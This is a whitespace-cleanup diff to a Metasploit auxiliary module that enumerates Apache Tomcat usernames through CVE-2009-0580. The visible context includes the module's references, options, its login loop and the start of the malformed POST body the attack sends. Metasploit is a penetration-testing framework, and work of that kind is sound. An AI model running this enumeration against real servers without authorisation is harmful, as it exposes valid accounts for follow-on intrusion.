@@ -32,14 +32,14 @@ class Metasploit3 < Msf::Auxiliary
 				'Leandro Oliveira <leandrofernando[at]gmail.com>'
 			],
 
-			'References'     => 
+			'References'     =>
 				[
 					['BID', '35196'],
 					['CVE', 'CVE-2009-0580'],
 					['OSVDB', '55055'],
-				],  
+				],
 				'License'        =>  MSF_LICENSE
-		)   
+		)
 
 		register_options(
 			[ Opt::RPORT(8080),
@@ -51,7 +51,7 @@ class Metasploit3 < Msf::Auxiliary
 			], self.class)
 
 		deregister_options('PASSWORD','PASS_FILE','USERPASS_FILE','STOP_ON_SUCCESS','BLANK_PASSWORDS','USERNAME')
-	end 
+	end
 
 	def target_url
 		"http://#{vhost}:#{rport}#{datastore['URI']}"
@@ -62,7 +62,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		each_user_pass {|user,pass|
 			do_login(user)
-		}   
+		}
 
 		if(@users_found.empty?)
 			print_status("#{target_url} - No users found.")
@@ -74,8 +74,8 @@ class Metasploit3 < Msf::Auxiliary
 				:type => 'tomcat.users',
 				:data => {:users =>  @users_found.keys.join(", ")}
 			)
-		end 
-	end 
+		end
+	end
 
 	def do_login(user)
 		post_data = "j_username=#{user}&password=%"
